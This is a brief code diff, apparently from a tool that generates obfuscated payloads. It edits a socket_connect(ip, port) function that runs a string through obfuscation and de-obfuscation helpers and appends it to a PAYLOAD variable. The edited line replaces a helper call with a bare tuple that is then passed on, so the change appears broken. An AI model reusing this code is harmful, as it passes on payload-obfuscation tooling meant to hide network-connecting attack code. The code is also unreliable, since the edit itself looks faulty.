@@ -235,7 +235,7 @@ def socket_connect(ip, port):
     add_string += call()
 
     of_string = factorOffus(add_string)
-    ofstring = factorOffusVar(add_string, of_string)
+    of_string = (add_string, of_string)
     deof_string = deOffus(of_string, add_string)
 
     PAYLOAD += deof_string
